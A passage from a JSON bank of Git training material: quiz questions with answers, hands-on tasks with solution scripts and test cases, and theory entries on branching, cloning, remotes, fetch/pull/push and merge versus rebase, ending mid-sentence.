            "`git checkout -b user-dashboard`"
          ],
          "analysisPoints": [
            "Understanding the convenience of `git checkout -b`.",
            "Distinguishing between creating a branch and switching to it.",
            "Familiarity with common Git commands for branching."
          ],
          "keyConcepts": [
            "git checkout -b",
            "Branches",
            "Workflow"
          ],
          "evaluationCriteria": [
            "Correctly identifying the combined command.",
            "Understanding its utility in a common workflow."
          ],
          "example": "The `git checkout -b <branch-name>` command is a shortcut for `git branch <branch-name>` followed by `git checkout <branch-name>`. It's the standard way to begin development on a new feature in an isolated branch.\n\n```bash\n# Current branch is 'main'\ngit checkout -b user-dashboard\n# Now, the current branch is 'user-dashboard'\n```",
          "tags": [
            "Git",
            "Branching",
            "Workflow",
            "MCQ"
          ],
          "prerequisites": [
            "theory_git_branches"
          ],
          "complexity": 4,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_branches_3",
          "topic": "Git Branch Deletion",
          "level": "hard",
          "type": "open",
          "question": "Explain the difference between `git branch -d <branch-name>` and `git branch -D <branch-name>`. When would you use one over the other?",
          "answer": "`git branch -d <branch-name>` (or `--delete`) is the 'safe' way to delete a branch. Git will only allow you to delete the branch if it has been fully merged into its upstream branch (or the current HEAD). This prevents accidental loss of work from unmerged commits. You would use this command when you have successfully merged a feature branch into `main` (or `develop`) and no longer need the feature branch.\n\n`git branch -D <branch-name>` (or `--delete --force`) is the 'force' delete command. It deletes the branch regardless of whether it has been merged or not. If the branch contains unmerged changes, those changes will be lost unless they exist on another branch. You would use this command cautiously in scenarios like:\n1.  You are absolutely sure the changes on the branch are not needed (e.g., experimental branch that failed).\n2.  You have already integrated the changes via a rebase or squash merge, and Git doesn't recognize it as a 'merged' branch (even though the content is integrated).\n3.  You created a branch by mistake and want to get rid of it immediately.",
          "analysisPoints": [
            "Understanding the 'safe' vs. 'force' aspect of branch deletion.",
            "Recognizing the implications of losing unmerged work.",
            "Providing clear use cases for each command."
          ],
          "keyConcepts": [
            "git branch -d",
            "git branch -D",
            "Branches",
            "Merging",
            "Force Delete"
          ],
          "evaluationCriteria": [
            "Clear and accurate explanation of both commands.",
            "Identification of appropriate use cases for each.",
            "Emphasis on the risk associated with `-D`."
          ],
          "example": "```bash\n# Scenario 1: Safe deletion after merge\ngit checkout main\ngit merge feature/my-feature # Merge completed\ngit branch -d feature/my-feature # This will succeed\n\n# Scenario 2: Force deletion of unmerged work (use with caution!)\ngit checkout main\ngit branch -D experimental-branch # This will delete, even if experimental-branch has unique commits\n```",
          "tags": [
            "Git",
            "Branching",
            "Deletion",
            "Open-Ended",
            "Advanced"
          ],
          "prerequisites": [
            "theory_git_branches"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_branches_4",
          "topic": "Git Branching",
          "level": "medium",
          "type": "code",
          "question": "You are on the `main` branch. A colleague asks you to inspect a branch named `fix/critical-bug` that they are working on, but you don't want to create a new branch or modify your current work. How would you temporarily switch to `fix/critical-bug` to view its state?",
          "answer": "```bash\ngit checkout fix/critical-bug\n```",
          "options": [],
          "analysisPoints": [
            "Understanding that `git checkout <branch-name>` is for switching to an existing branch.",
            "Knowing that `git checkout` updates the working directory to the state of the target branch."
          ],
          "keyConcepts": [
            "git checkout",
            "Branches",
            "Switching Branches"
          ],
          "evaluationCriteria": [
            "Correct use of `git checkout` for an existing branch.",
            "Implicit understanding of temporary context switch."
          ],
          "example": "This is a straightforward application of `git checkout` to move between existing branches. It updates your working directory to match the commit that `fix/critical-bug` points to.\n\n```bash\n# Assume 'main' is current branch\n# Simulate a branch existing\ngit branch fix/critical-bug\n\n# Switch to it\ngit checkout fix/critical-bug\n```",
          "tags": [
            "Git",
            "Branching",
            "Code Challenge",
            "Basic"
          ],
          "prerequisites": [
            "theory_git_branches"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_branches_5",
          "topic": "Git Branch Inspection",
          "level": "medium",
          "type": "flashcard",
          "question": "Which `git branch` option would you use to see detailed information for each branch, including its last commit and tracking information?",
          "answer": "`git branch -v` (or `--verbose`)",
          "options": [],
          "analysisPoints": [
            "Recall of advanced `git branch` options for more detailed output.",
            "Understanding the kind of information provided by `-v`."
          ],
          "keyConcepts": [
            "git branch",
            "Verbose",
            "Branch Information"
          ],
          "evaluationCriteria": [
            "Accurate recall of the option for detailed branch view."
          ],
          "example": "```bash\ngit branch -v\n```",
          "tags": [
            "Git",
            "Branching",
            "Flashcard",
            "Advanced"
          ],
          "prerequisites": [
            "theory_git_branches"
          ],
          "complexity": 4,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_remote_1",
          "topic": "Git Remote Repositories",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of a remote repository in Git?",
          "answer": "To enable collaboration among developers and provide a centralized backup of the project's history.",
          "options": [],
          "analysisPoints": [
            "Understanding the core benefits of remote repositories."
          ],
          "keyConcepts": [
            "Remote Repository",
            "Collaboration",
            "Backup"
          ],
          "evaluationCriteria": [
            "Ability to state the main purpose."
          ],
          "example": "Remote repositories, like those hosted on GitHub, allow multiple developers to push and pull changes, keeping their local copies synchronized and providing a single source of truth for the project.",
          "tags": [
            "Git",
            "Remote",
            "Flashcard"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_remote_2",
          "topic": "Git Remote Repositories",
          "level": "medium",
          "type": "mcq",
          "question": "When you use `git clone <repository-url>`, what is the default name Git assigns to the remote repository that points back to the original URL?",
          "answer": "`origin`",
          "options": [
            "`upstream`",
            "`master`",
            "`origin`",
            "`remote`"
          ],
          "analysisPoints": [
            "Knowledge of default Git remote naming conventions.",
            "Understanding how Git establishes the link to the original repository."
          ],
          "keyConcepts": [
            "git clone",
            "Remote Repository",
            "Origin"
          ],
          "evaluationCriteria": [
            "Correctly identifying the default remote name.",
            "Distinguishing it from other common Git terms."
          ],
          "example": "When you clone a repository, Git automatically creates a remote entry named `origin` that points to the URL you cloned from. This `origin` is then used by commands like `git push origin main` or `git pull origin main` to interact with the remote.\n\n```bash\ngit clone https://github.com/some/repo.git\n# Check remotes:\ngit remote -v\n# Output will typically show 'origin' pointing to the cloned URL.\n# origin  https://github.com/some/repo.git (fetch)\n# origin  https://github.com/some/repo.git (push)\n```",
          "tags": [
            "Git",
            "Remote",
            "git clone",
            "MCQ"
          ],
          "prerequisites": [
            "theory_git_remote_repos"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_remote_3",
          "topic": "Git Remote Repositories",
          "level": "hard",
          "type": "open",
          "question": "You have cloned a repository using `git clone <repo-url>`. Describe what information and files are downloaded to your local machine as a result of this command.",
          "answer": "When you clone a repository using `git clone <repo-url>`, the following information and files are downloaded to your local machine:\n\n1.  **All project files**: The entire codebase, including all folders and files, as they exist in the latest commit of the default branch (usually `main` or `master`). This is what you see in your working directory.\n2.  **Full commit history**: The complete history of all commits for all branches in the remote repository. This includes all previous versions of files, commit messages, authors, dates, and the entire commit graph. This information is stored in the `.git` directory.\n3.  **All branches**: Pointers to all branches existing on the remote repository. These are set up as remote-tracking branches (e.g., `origin/main`, `origin/feature`). You can then check them out locally.\n4.  **All tags**: Any tags (like version releases, e.g., `v1.0.0`) that exist in the remote repository.\n5.  **Remote configuration**: A remote named `origin` (by default) is automatically configured to point back to the `repository-url`. This allows you to easily `pull` updates from and `push` changes to the original remote repository.",
          "analysisPoints": [
            "Understanding that cloning brings down the entire history, not just the latest snapshot.",
            "Knowledge of the `.git` directory's contents (history, branches, refs).",
            "Awareness of remote-tracking branches and the default `origin` setup."
          ],
          "keyConcepts": [
            "git clone",
            "Remote Repository",
            "Local Repository",
            "Commit History",
            "Branches",
            "Tags"
          ],
          "evaluationCriteria": [
            "Comprehensive description of what's downloaded.",
            "Accuracy regarding history, branches, and remote setup.",
            "Clarity and organization of points."
          ],
          "example": "This question tests the understanding of what a Git clone operation fundamentally entails, beyond just getting the current files. It highlights Git's distributed nature where each clone is a full backup.",
          "tags": [
            "Git",
            "Remote",
            "git clone",
            "Open-Ended",
            "Fundamentals"
          ],
          "prerequisites": [
            "theory_git_remote_repos"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_git_staging_and_commit",
          "title": "Simulate a Git Workflow: Staging and Committing Changes",
          "description": "\nYou are developing a simple web page. You have an existing `index.html` file, you add a new `styles.css` file, and you modify `script.js`. Your goal is to stage only the `index.html` and `script.js` changes, commit them, and then stage and commit `styles.css` in a separate commit. You must ensure `styles.css` is not part of the first commit.\n\n**Requirements:**\n1.  Initialize a new Git repository.\n2.  Create `index.html` with some initial content.\n3.  Commit `index.html` as the 'Initial commit'.\n4.  Modify `index.html`.\n5.  Create `styles.css`.\n6.  Modify `script.js`.\n7.  Stage *only* `index.html` and `script.js`.\n8.  Commit the staged changes with a message like 'feat: Update homepage and add script logic'.\n9.  Verify `styles.css` is still unstaged.\n10. Stage `styles.css`.\n11. Commit `styles.css` with a message like 'style: Add base styles'.\n12. Verify all files are committed and working directory is clean.\n",
          "difficulty": "medium",
          "startingCode": "# Instructions: Use the following comments to guide your commands.\n# Do NOT paste this directly into your terminal, execute commands one by one.\n\n# 1. Create a new directory and initialize Git.\nmkdir my-web-project\ncd my-web-project\ngit init\n\n# 2. Create index.html and add initial content.\necho \"<h1>Hello World</h1>\" > index.html\n\n# 3. Commit index.html as the 'Initial commit'.\n# git add ...\n# git commit ...\n\n# 4. Modify index.html, create styles.css, modify script.js\necho \"<p>Welcome to my site.</p>\" >> index.html\ntouch styles.css\necho \"console.log('Script loaded');\" > script.js\n\n# 5. Stage ONLY index.html and script.js.\n# git add ...\n# git add ...\n\n# 6. Commit the staged changes.\n# git commit -m \"...\"\n\n# 7. Verify styles.css is still unstaged.\n# git status\n\n# 8. Stage styles.css.\n# git add ...\n\n# 9. Commit styles.css.\n# git commit -m \"...\"\n\n# 10. Verify all files are committed and working directory is clean.\n# git status\n# git log --oneline\n",
          "solutionCode": "mkdir my-web-project\ncd my-web-project\ngit init\n\necho \"<h1>Hello World</h1>\" > index.html\ngit add index.html\ngit commit -m \"Initial commit\"\n\necho \"<p>Welcome to my site.</p>\" >> index.html\ntouch styles.css\necho \"console.log('Script loaded');\" > script.js\n\ngit add index.html\ngit add script.js\ngit commit -m \"feat: Update homepage and add script logic\"\n\ngit status\n\ngit add styles.css\ngit commit -m \"style: Add base styles\"\n\ngit status\ngit log --oneline\n",
          "testCases": [
            "Repository initialized correctly.",
            "First commit exists with 'Initial commit' message and only `index.html`.",
            "`index.html` and `script.js` are included in the second commit.",
            "`styles.css` is NOT included in the second commit (verified by `git status` after second commit).",
            "`styles.css` is included in the third commit.",
            "Final `git status` shows a clean working directory.",
            "`git log --oneline` shows three commits with the specified messages.",
            "Commit messages adhere to best practices."
          ],
          "hints": [
            "Remember that `git add .` stages all new and modified files in the current directory and its subdirectories. To stage specific files, list them explicitly.",
            "Always check `git status` to verify what's in your working directory and staging area before committing.",
            "Commit messages should be concise and descriptive. Consider using conventional commit prefixes like `feat:` or `style:`."
          ],
          "tags": [
            "Git",
            "Staging",
            "Commit",
            "Workflow",
            "Beginner"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "theory_git_staging_area",
            "theory_git_commit"
          ],
          "complexity": 5,
          "interviewRelevance": 9,
          "learningPath": "beginner",
          "relatedConcepts": [
            "Working Directory",
            "Staging Area",
            "Local Repository"
          ]
        },
        {
          "id": "task_git_branching_workflow",
          "title": "Implement a Feature Branch Workflow",
          "description": "\nYou are tasked with adding a new 'contact us' page to an existing project. Implement the standard Git feature branching workflow for this task.\n\n**Requirements:**\n1.  Start on the `main` branch (simulate this by initializing a repo and making an initial commit).\n2.  Create a new branch named `feature/contact-page` and switch to it in a single command.\n3.  Create a new file `contact.html` with some content in the `feature/contact-page` branch.\n4.  Stage and commit `contact.html` with an appropriate message.\n5.  Switch back to the `main` branch.\n6.  Simulate a merge (e.g., `git merge feature/contact-page`, though the exact merge isn't required to be successful for this task, just the command execution).\n7.  Safely delete the `feature/contact-page` branch, assuming it has been successfully integrated.",
          "difficulty": "medium",
          "startingCode": "# Instructions: Execute the following commands in your terminal.\n\n# 1. Initialize a new Git repository and make an initial commit on 'main'.\nmkdir my-app\ncd my-app\ngit init -b main\necho \"<body>Main page</body>\" > index.html\ngit add index.html\ngit commit -m \"Initial commit: Setup basic index.html\"\n\n# 2. Create and switch to a new branch 'feature/contact-page'.\n# git checkout -b ...\n\n# 3. Create contact.html with content.\necho \"<h1>Contact Us</h1><p>Get in touch!</p>\" > contact.html\n\n# 4. Stage and commit contact.html.\n# git add ...\n# git commit -m \"...\"\n\n# 5. Switch back to the 'main' branch.\n# git checkout ...\n\n# 6. Simulate a merge (just run the command, don't worry about conflicts).\n# git merge ...\n\n# 7. Safely delete the 'feature/contact-page' branch.\n# git branch -d ...\n",
          "solutionCode": "mkdir my-app\ncd my-app\ngit init -b main\necho \"<body>Main page</body>\" > index.html\ngit add index.html\ngit commit -m \"Initial commit: Setup basic index.html\"\n\ngit checkout -b feature/contact-page\n\necho \"<h1>Contact Us</h1><p>Get in touch!</p>\" > contact.html\ngit add contact.html\ngit commit -m \"feat: Add contact us page\"\n\ngit checkout main\n\ngit merge feature/contact-page # This will fast-forward in this simulation, no actual merge commit needed\n\ngit branch -d feature/contact-page\n",
          "testCases": [
            "Repository initialized with `main` branch and initial commit.",
            "`feature/contact-page` branch is created and active after step 2.",
            "`contact.html` exists and is committed on `feature/contact-page`.",
            "Current branch is `main` after step 5.",
            "`feature/contact-page` branch is successfully deleted at the end.",
            "`git log --oneline --graph` should show the branch history and merge.",
            "`contact.html` content should be present in `main` branch after merge."
          ],
          "hints": [
            "Remember the single command shortcut to create and switch to a new branch.",
            "Always commit your changes on the feature branch *before* switching back to `main`.",
            "`git branch -d` will only work if the branch has been successfully merged."
          ],
          "tags": [
            "Git",
            "Branching",
            "Workflow",
            "Merge",
            "Intermediate"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "theory_git_branches",
            "theory_git_commit"
          ],
          "complexity": 6,
          "interviewRelevance": 10,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Feature Branching",
            "Merging",
            "Branch Deletion"
          ]
        },
        {
          "id": "task_git_history_exploration",
          "title": "Explore Git Commit History",
          "description": "\nYou've joined a project and need to understand its recent development. Your task is to navigate and extract specific information from a simulated Git commit history.\n\n**Requirements:**\n1.  Initialize a new Git repository.\n2.  Create the following commit history in sequence (commit messages are important!):\n    *   Initial commit: `feat: Setup project structure`\n    *   Second commit: `fix: Resolve header overflow on mobile` (on `main`)\n    *   Create a new branch `feature/admin-panel` from `main`.\n    *   Third commit (on `feature/admin-panel`): `feat: Implement basic admin dashboard`\n    *   Fourth commit (on `feature/admin-panel`): `refactor: Optimize database queries`\n    *   Switch back to `main`.\n    *   Fifth commit (on `main`): `style: Refine typography on landing page`\n    *   Merge `feature/admin-panel` into `main`.\n3.  After creating the history, use `git log` commands to answer the following questions:\n    *   How many total commits are there? (Provide the command and count)\n    *   What is the full commit message and author of the 'Initial commit'? (Provide the command and output)\n    *   Display the commit history with a visual graph, showing all branches, and each commit on a single line. (Provide the command and simulated output).\n",
          "difficulty": "hard",
          "startingCode": "# Instructions: Execute the following commands in your terminal to build the history, then answer the questions.\n\n# 1. Initialize repository and make initial commit.\nmkdir history-explorer\ncd history-explorer\ngit init -b main\necho \"Project files\" > project.txt\ngit add .\ngit commit -m \"feat: Setup project structure\"\n\n# 2. Second commit on main\necho \"Header fix\" >> project.txt\ngit add .\ngit commit -m \"fix: Resolve header overflow on mobile\"\n\n# 3. Create and switch to feature/admin-panel\n# git checkout -b ...\n\n# 4. Third commit on feature/admin-panel\necho \"Admin panel\" >> admin.txt\ngit add .\n# git commit -m \"...\"\n\n# 5. Fourth commit on feature/admin-panel\necho \"DB query opt\" >> admin.txt\ngit add .\n# git commit -m \"...\"\n\n# 6. Switch back to main\n# git checkout ...\n\n# 7. Fifth commit on main\necho \"Typography\" >> project.txt\ngit add .\n# git commit -m \"...\"\n\n# 8. Merge feature/admin-panel into main\n# git merge ...\n\n# --- Answer the questions below using git log commands --- \n# Q1: How many total commits are there?\n# Command: ...\n# Count: ...\n\n# Q2: What is the full commit message and author of the 'Initial commit'?\n# Command: ...\n# Output: ...\n\n# Q3: Display the commit history with a visual graph, showing all branches, and each commit on a single line.\n# Command: ...\n# Simulated Output: ...\n",
          "solutionCode": "mkdir history-explorer\ncd history-explorer\ngit init -b main\necho \"Project files\" > project.txt\ngit add .\ngit commit -m \"feat: Setup project structure\"\n\necho \"Header fix\" >> project.txt\ngit add .\ngit commit -m \"fix: Resolve header overflow on mobile\"\n\ngit checkout -b feature/admin-panel\n\necho \"Admin panel\" > admin.txt\ngit add .\ngit commit -m \"feat: Implement basic admin dashboard\"\n\necho \"DB query opt\" >> admin.txt\ngit add .\ngit commit -m \"refactor: Optimize database queries\"\n\ngit checkout main\n\necho \"Typography\" >> project.txt\ngit add .\ngit commit -m \"style: Refine typography on landing page\"\n\ngit merge feature/admin-panel --no-edit # --no-edit to avoid opening editor\n\n# Answers:\n# Q1: How many total commits are there?\n# Command: git log --oneline | wc -l (on Linux/macOS) OR just count visually from git log --oneline\n# Count: 6 (Initial, Header, Admin Dashboard, DB Opt, Typography, Merge Admin Panel)\n\n# Q2: What is the full commit message and author of the 'Initial commit'?\n# Command: git log --reverse | head -n 5\n# (Alternatively: git log <initial_commit_sha> or git log --all --grep=\"Initial commit\" -1)\n# Output (simulated, author will vary):\n# commit <SHA of initial commit>\n# Author: Your Name <your.email@example.com>\n# Date:   <Date and Time>\n#\n#     feat: Setup project structure\n\n# Q3: Display the commit history with a visual graph, showing all branches, and each commit on a single line.\n# Command: git log --oneline --graph --all --decorate\n# Simulated Output (order/SHAs will vary, but structure is key):\n# *   <merge_sha> (HEAD -> main) Merge branch 'feature/admin-panel'\n# |\\ \n# | * <admin_panel_commit_2_sha> (feature/admin-panel) refactor: Optimize database queries\n# | * <admin_panel_commit_1_sha> feat: Implement basic admin dashboard\n# * | <main_commit_3_sha> style: Refine typography on landing page\n# |/  \n# * <main_commit_2_sha> fix: Resolve header overflow on mobile\n# * <initial_commit_sha> feat: Setup project structure\n",
          "testCases": [
            "Repository history matches the specified structure and commit messages.",
            "Correct command provided for total commit count.",
            "Correct command provided for retrieving initial commit details.",
            "Correct command provided for graphical history, and the simulated output matches the expected graph structure."
          ],
          "hints": [
            "The `git log` command is very powerful. Explore its various flags like `--oneline`, `--graph`, `--all`, `--reverse`, `--author`, `--grep` for filtering and formatting.",
            "To get the SHA of the initial commit, you can use `git log --reverse | head -n 1` or `git rev-list --max-parents=0 HEAD`.",
            "For counting commits, `git log --oneline | wc -l` (on Linux/macOS) is a useful trick, but a visual count is also acceptable for small histories."
          ],
          "tags": [
            "Git",
            "History",
            "Branching",
            "Visualization",
            "Advanced",
            "Problem Solving"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "theory_git_log",
            "theory_git_branches",
            "theory_git_commit"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Commit Graph",
            "Branch Pointers",
            "Log Filtering"
          ]
        },
        {
          "id": "task_git_remote_simulation",
          "title": "Simulate Cloning a Remote Repository",
          "description": "\nAs a new team member, your first task is to get a local copy of the existing project from a remote repository. Simulate this process and verify its outcome.\n\n**Requirements:**\n1.  **Simulate Remote**: Create a 'bare' Git repository to act as your remote (this is a common way to simulate a server-side repository without a full server).\n    *   `mkdir /tmp/remote_repo.git` (or any temporary location)\n    *   `cd /tmp/remote_repo.git`\n    *   `git init --bare`\n2.  **Populate Remote (optional but good practice)**: Clone this bare repo, add some files, commit, and push back to the bare repo. This makes the 'remote' non-empty.\n    *   `cd /tmp`\n    *   `git clone /tmp/remote_repo.git local_temp_clone`\n    *   `cd local_temp_clone`\n    *   `echo \"# My Project\" > README.md`\n    *   `git add README.md`\n    *   `git commit -m \"Initial project setup with README\"`\n    *   `git push origin main` (or master)\n    *   `cd ..`\n    *   `rm -rf local_temp_clone` (clean up temp clone)\n3.  **Perform Clone**: Now, clone the simulated remote repository into a new directory for your work.\n    *   `git clone /tmp/remote_repo.git my-frontend-project`\n4.  **Verify Clone**: After cloning, perform the following checks:\n    *   List the contents of the newly cloned directory to confirm `README.md` is present.\n    *   Check the Git remotes to ensure `origin` is correctly configured to point to the simulated remote URL.\n    *   Display the commit log to confirm the initial commit history is present.\n",
          "difficulty": "medium",
          "startingCode": "# Instructions: Execute the following commands step-by-step.\n\n# 1. Simulate Remote Repository (bare repo)\nmkdir /tmp/remote_repo.git\ncd /tmp/remote_repo.git\ngit init --bare\n\n# 2. Populate Remote (add content and push back)\ncd /tmp\ngit clone /tmp/remote_repo.git local_temp_clone\ncd local_temp_clone\necho \"# My Project\" > README.md\ngit add README.md\ngit commit -m \"Initial project setup with README\"\ngit push origin main\ncd ..\nrm -rf local_temp_clone\n\n# 3. Perform the actual clone into your working directory\n# git clone ...\n\n# 4. Verify the clone\n# ls ...\n# git remote -v\n# git log --oneline\n",
          "solutionCode": "# Step 1: Simulate Remote Repository (bare repo)\nmkdir /tmp/remote_repo.git\ncd /tmp/remote_repo.git\ngit init --bare\n\n# Step 2: Populate Remote (add content and push back)\ncd /tmp\ngit clone /tmp/remote_repo.git local_temp_clone\ncd local_temp_clone\necho \"# My Project\" > README.md\ngit add README.md\ngit commit -m \"Initial project setup with README\"\ngit push origin main\ncd ..\nrm -rf local_temp_clone\n\n# Step 3: Perform the actual clone into your working directory\ngit clone /tmp/remote_repo.git my-frontend-project\n\n# Step 4: Verify the clone\ncd my-frontend-project\nls # Should show README.md\ngit remote -v # Should show 'origin' pointing to /tmp/remote_repo.git\ngit log --oneline # Should show the 'Initial project setup with README' commit\n",
          "testCases": [
            "Bare repository created successfully.",
            "Remote repository contains the `README.md` and initial commit.",
            "`my-frontend-project` directory is created.",
            "`README.md` is present in `my-frontend-project`.",
            "Output of `git remote -v` in `my-frontend-project` shows `origin` linked to `/tmp/remote_repo.git`.",
            "Output of `git log --oneline` in `my-frontend-project` shows the 'Initial project setup with README' commit.",
            "Working directory is clean after cloning (implied by content being the latest commit)."
          ],
          "hints": [
            "A bare repository is a Git repository without a working directory; it's what's typically hosted on a server.",
            "Remember that `git clone` automatically sets up the `origin` remote.",
            "Use `ls` to check file presence and `git remote -v` to verify remote configurations."
          ],
          "tags": [
            "Git",
            "Remote",
            "git clone",
            "Setup",
            "Beginner"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "theory_git_remote_repos",
            "theory_git_commit"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "beginner",
          "relatedConcepts": [
            "Local Repository",
            "Bare Repository",
            "Origin Remote"
          ]
        }
      ]
    }
  },
  {
    "id": "5bd720eb-0888-42b4-9712-9e2ac43b9bea",
    "startLine": 10400,
    "endLine": 10499,
    "processedDate": "2025-06-17T11:34:23.200Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_git_remote_management",
          "title": "Git Remote Repository Management",
          "content": "Managing remote repositories is a fundamental aspect of collaborative Git workflows. Remote repositories are versions of your project that are hosted on the internet or network, accessible by multiple developers. The commands in this section allow you to connect your local repository to these remote versions, inspect existing connections, and understand where your code can be pushed or pulled from.\n\n## Key Concepts\n*   **Remote:** A remote is simply a bookmark for another repository. It's a named reference to a URL. The default remote name is usually `origin`.\n*   **URL:** The address of the remote repository, which can be an SSH URL (e.g., `git@github.com:user/repo.git`) or an HTTPS URL (e.g., `https://github.com/user/repo.git`).\n*   **Adding a Remote:** The `git remote add` command establishes a new connection to a remote repository, associating a short, memorable name with a lengthy URL.\n*   **Viewing Remotes:** The `git remote -v` command lists all configured remote repositories along with their URLs for both fetching and pushing. This helps in verifying the configured remotes and their access types.",
          "examples": [
            {
              "id": "example_git_remote_add_1",
              "title": "Adding a new remote named 'origin'",
              "code": "git remote add origin https://github.com/your-username/your-repo.git",
              "explanation": "This command adds a new remote repository with the short name `origin` and associates it with the provided HTTPS URL. `origin` is the conventional name for the primary remote, especially the one from which the repository was initially cloned.",
              "language": "bash"
            },
            {
              "id": "example_git_remote_view_1",
              "title": "Viewing all configured remotes",
              "code": "git remote -v\n# Expected output example:\n# origin  https://github.com/your-username/your-repo.git (fetch)\n# origin  https://github.com/your-username/your-repo.git (push)\n# upstream  https://github.com/original-project/original-repo.git (fetch)\n# upstream  https://github.com/original-project/original-repo.git (push)",
              "explanation": "The `-v` (verbose) flag shows the URLs that Git has stored for the shortnames. It displays both the fetch and push URLs, which are often the same but can be different in advanced setups (e.g., for read-only mirrors).",
              "language": "bash"
            }
          ],
          "relatedQuestions": [
            "question_git_remote_add_1",
            "question_git_remote_v_1",
            "question_git_remote_multiple_1",
            "question_git_remote_add_explain_1"
          ],
          "relatedTasks": [
            "task_git_init_and_remote",
            "task_git_contributor_setup"
          ],
          "tags": [
            "Git",
            "Remote",
            "Repository",
            "Collaboration",
            "Setup"
          ],
          "technology": "Git",
          "prerequisites": [
            "git_basics",
            "command_line_basics"
          ],
          "complexity": 4,
          "interviewRelevance": 7,
          "learningPath": "beginner",
          "requiredFor": [
            "git_collaboration",
            "distributed_version_control"
          ]
        },
        {
          "id": "theory_git_remote_sync",
          "title": "Git Remote Synchronization: Fetch, Pull, and Push",
          "content": "Synchronizing changes between your local repository and remote repositories is the core of collaborative development. Git provides distinct commands for retrieving changes from a remote (fetch and pull) and sending your local changes to a remote (push). Understanding the differences and implications of each command is crucial for maintaining a clean and collaborative workflow.\n\n## Key Concepts\n*   **`git fetch <remote>`:** This command downloads new data from a remote repository into your local repository. It retrieves all the branches and commits that are not yet in your local copy, but it **does not** merge or modify your local working directory or current branch. It's a 'safe' way to see what others have been doing without affecting your current work.\n*   **`git pull <remote> <branch>`:** This command is essentially a combination of `git fetch` followed by `git merge`. It downloads changes from the specified remote branch and then attempts to integrate them into your current local branch. By default, it performs a fast-forward merge if possible, or a three-way merge creating a merge commit if there are divergent histories.\n*   **`git pull --rebase <remote> <branch>`:** This is a variation of `git pull` where, instead of merging, it performs a `git fetch` followed by a `git rebase`. This command takes your local commits, 'unwinds' them, applies the remote changes to your branch, and then 'reapplies' your local commits on top of the updated remote history. The primary benefit is a linear project history, avoiding extra merge commits, which can make the history cleaner.\n*   **`git push <remote> <branch>`:** This command is used to upload your local commits to the specified remote repository and branch. It makes your local changes available to others. For a push to succeed, your local history must be a fast-forward of the remote branch's history (i.e., you haven't rewritten history that others might have based their work on, or you haven't pushed if there are new changes on the remote you haven't integrated yet).",
          "examples": [
            {
              "id": "example_git_fetch_1",
              "title": "Fetching changes from 'origin'",
              "code": "git fetch origin\n# After fetching, you can inspect the remote branch's state:\n# git log origin/master",
              "explanation": "This command fetches all new commits and objects from the `origin` remote. It updates your remote-tracking branches (e.g., `origin/master`), allowing you to see their current state without changing your local `master` branch.",
              "language": "bash"
            },
            {
              "id": "example_git_pull_1",
              "title": "Pulling changes from 'origin/main' into current branch",
              "code": "git pull origin main",
              "explanation": "This command first fetches changes from the `main` branch of the `origin` remote and then merges them into your currently checked-out branch. If there are no conflicts, the changes are integrated.",
              "language": "bash"
            },
            {
              "id": "example_git_pull_rebase_1",
              "title": "Pulling changes from 'origin/master' with rebase",
              "code": "git pull --rebase origin master",
              "explanation": "This command fetches changes from `origin/master` and then rebases your local commits on top of the fetched history. This is often preferred in feature branches to keep the history linear and clean, avoiding unnecessary merge commits.",
              "language": "bash"
            },
            {
              "id": "example_git_push_1",
              "title": "Pushing current branch to 'origin'",
              "code": "git push origin HEAD",
              "explanation": "This command pushes the current local branch (`HEAD`) to the `origin` remote, assuming there is a corresponding branch on the remote. If the remote branch doesn't exist, it will create it.",
              "language": "bash"
            }
          ],
          "relatedQuestions": [
            "question_git_fetch_pull_1",
            "question_git_pull_rebase_adv_1",
            "question_git_push_force_1",
            "question_git_sync_scenario_1",
            "question_git_push_upstream_1"
          ],
          "relatedTasks": [
            "task_git_sync_feature_branch",
            "task_git_resolve_push_conflict"
          ],
          "tags": [
            "Git",
            "Synchronization",
            "Fetch",
            "Pull",
            "Push",
            "Remote",
            "Collaboration"
          ],
          "technology": "Git",
          "prerequisites": [
            "git_remote_management",
            "git_branching_basics"
          ],
          "complexity": 6,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "collaborative_development",
            "maintaining_clean_history"
          ]
        },
        {
          "id": "theory_git_history_management",
          "title": "Git History Management: Merge and Rebase",
          "content": "Git offers two primary strategies for integrating changes from one branch into another: merging and rebasing. Both achieve the goal of combining work, but they do so in fundamentally different ways that affect your project's commit history. Understanding these differences is crucial for maintaining a clear, readable, and effective version control history.\n\n## Key Concepts\n*   **`git merge <branch>`:** This command integrates changes from the specified `<branch>` into your current branch. Git identifies a common ancestor between the two branches and then combines the changes, creating a new 'merge commit' if the histories have diverged. If the current branch is a direct ancestor of the merging branch, Git performs a 'fast-forward' merge, simply moving the pointer forward without creating a new commit. Merging preserves the full history, including all merge points.\n*   **`git merge --no-ff <branch>`:** The `--no-ff` (no fast-forward) option forces Git to always create a new merge commit, even if a fast-forward merge would be possible. This is useful for maintaining a clear record of when branch integrations occurred, explicitly showing the merge points in the history graph, which can be beneficial for understanding release history or feature lifecycles.\n*   **`git rebase <branch>`:** This command reapplies commits from your current branch onto the tip of another specified `<branch>`. Instead of creating a merge commit, rebase effectively 'rewrites' the history of your current branch by moving its base to the target branch's tip. This results in a linear history, making it easier to follow 